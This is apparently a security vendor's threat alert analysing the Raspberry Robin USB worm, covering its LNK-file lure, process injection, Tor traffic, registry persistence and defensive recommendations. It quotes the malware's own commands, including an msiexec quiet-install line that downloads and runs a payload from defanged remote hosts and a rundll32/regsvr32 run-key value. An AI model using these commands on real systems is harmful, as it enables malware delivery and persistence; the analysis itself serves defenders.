The Cybereason Global Security Operations Center (SOC) Team issues Cybereason Threat
Alerts to inform customers of emerging impacting threats. The Alerts summarize these
threats and provide practical recommendations for protecting against them.

What's Happening?
The Cybereason team is investigating a series of recent infections with the Raspberry Robin
campaign, also associated with the name “LNK Worm.” Raspberry Robin involves a worm
that spreads over USB devices or shared folders, leveraging compromised QNAP (Network
Attached Storage or NAS) devices as stagers. It uses an old but still effective method of
using “LNK” shortcut files to lure its victims.

Key Observations
Raspberry Robin is a spreading threat, using specifically crafted Microsoft links (LNK
files) to infect its victims. Cybereason observed delivery through file archives,
removable devices (USB) or ISO files.
Raspberry Robin is a persistent threat. Once the malware infects a machine, it
establishes persistence by running at every system startup.
Cybereason observed a majority of the victims being located in Europe.

Analysis
This section describes the different processes that we observed, involved in Raspberry
Robin infections. The following diagram represents the overall malicious activity seen in a
Raspberry Robin infection chain:

Summarized infection process for Raspberry Robin
The GSOC team summarizes a Raspberry Robin infection as follows :
2/13

The Raspberry Robin-related infections start from two files present in the same
directory hosted on an external device or shared drive:
a “LNK” file that contains a Windows shell command
another file that acts as a “BAT” file, filled with padding data and two specific
commands
Raspberry Robin leverages the LOLBin called “msiexec.exe” to download and execute
a malicious shared library (DLL) from a compromised NAS device from the vendor
“QNAP”.
To make it harder to detect, Raspberry Robin:
leverages process injections in three legitimate Windows system processes
communicates with the rest of Raspberry Robin’s infrastructure through Tor (The
Onion Router) Exit nodes
To persist on the infected system, Raspberry Robin uses a registry key to automatically
load a malicious module through the Windows binary “rundll32.exe”, at the machine
startup.

Infection Process
Based on public samples we analyzed (i.e. MD5 hash
22531e030b05dbaafe9932b8779c73f6), the initial set of two files can be present on an
external storage device or simply in a compressed archive. It contains:
A LNK file (i.e. “USB Drive.lnk”), which is the initial infection trigger, and contains the
first “cmd.exe” execution, such as C:\Windows\System32\cmd.exe" /r tYPE
xPhfK.Usb|CmD.
Another file, xPhfK.Usb, which contains random binary data as well as two commands:
explorer.exe ADATA uFD and mSIExEC /Q I"hTTP://u0[.]pm:8080/80wOpGuotSU/USER-PC?admin" “ to download and execute
a second attack stage:

Process cmd.exe taking content of “WYcZ.CFg” file as an input to execute “process
msiexec.exe” as seen in the Cybereason Defense Platform
The fact that the initial “cmd.exe” spawns from the “explorer.exe” process is the result of
“LNK” files execution.

Download and Execute
The initial infection vector launches “msiexec.exe” with a full malicious URL as an argument
as well as “[/-]q” (quiet mode) and “[/-]i” (normal installation mode). Amongst the different
attacks observed, the arguments are ordered differently and use different patterns, for
example with or without a space.
An example pattern for this command is:
msIEXeC -Q/i ""htTP://6y[.]RE:8080/5CBniie70Rw/[Machine name]=[Victim user name]"
(where the machine name and victim name are replaced by actual values).
As the normal installation proceeds, the msiexec.exe command listed above creates
another msiexec.exe /V process, launched from services.exe.
This second msiexec.exe /V process then spawns a third msiexec.exe process, which
loads a malicious module named msi[...].tmp and is the malware stage downloaded from its
parent msiexec.exe /V process:

compromised device as seen in the Cybereason Defense Platform

Extract from “https://www.shodan.io/host/195.158.67.252”, showing that the server that
resolves from “6y[.]re” is a QNAP device with a service hosted on TCP port 8080

Spread Through Process Injection
The next step for this threat is to inject itself into other processes, namely “rundll32.exe,”
“dllhost.exe” and “regsvr32.exe” on the observed victims. The Cybereason Defense Platform
detects this injection and can help to link the creator process and the created ones.
The number of injected system processes is generally high (between 50 and 300) and some
of these processes communicate with TOR (The Onion Router) exit nodes:

Raspberry Robin injecting system processes, which then communicate with TOR-related IP
addresses, as seen in the Cybereason Defense Platform

Persistence
Raspberry Robin installs itself into a registry “run” key in the Windows user’s hive, for
example:
“Hku\[GUID]\software\microsoft\windows\currentversion\runonce\vayp” with value
“RUNDLL32 SHELL32.DLL,ShellExec_RunDLLA REGSVR32.EXE /u -S "C:\Users\
[UserName]\AppData\Local\Temp\cnsbi.mh."
As a result, “rundll32.exe” loads the same DLL as the one which the initial “msiexec.exe”
process downloaded in the infection stage. It then proceeds with the same process injection
and communication as described above.
The loaded DLL has a random extension (pi.loc, cr.mf, etc.) and “rundll32.exe” loads it with a
“.” at the end:

Cybereason Defense Platform
Regarding the persistence aspects, the following diagram represents the way the malicious
module executes at each machine startup:

machine boot
As the malicious module is the same one as during the initial infection process, it displays
the same malicious activities involving process injection and communication with Tor exit
nodes.
This module contains specific indicators, including the fact that it masquerades as an Apache
shared library (DLL) called “libapriconv-1.dll”:

8/13

Raspberry Robin leverages malicious module loading masquerading as Apache shared
libraries (DLL)
The other samples the GSOC team identified on other Raspberry Robin cases also use
different masquerading processes (for instance, impersonating “QT 5”).
This specific module is also peculiar due to the fact that the chain of certification is broken,
making it signed but not verified by the Windows system. The code signing name is
“OmniContact” and can be used as a filter on VirusTotal.com to check for similar samples.

9/13

Excerpt from virustotal.com showing a sample detailed information
In 75% of the observed victims, the malicious module downloaded by Raspberry Robin was
signed by “OmniContact.”

Network Communications
Finally, the victim devices of Raspberry Robin created a high amount of network packets to
TOR exit nodes. The GSOC team observed that the TCP ports used were 80, 443 and 8080.

Cybereason Recommendations
10/13

The Cybereason Defense Platform detects and prevents Raspberry Robin infections in
Microsoft products. Cybereason recommends the following:
Block outgoing connections (outside of the organization) to TOR-related addresses, as
Raspberry Robin actively communicates with TOR exit nodes.
As Raspberry Robin displays persistence mechanisms and establishes many
masquerading actions on the infected system, re-image infected devices.
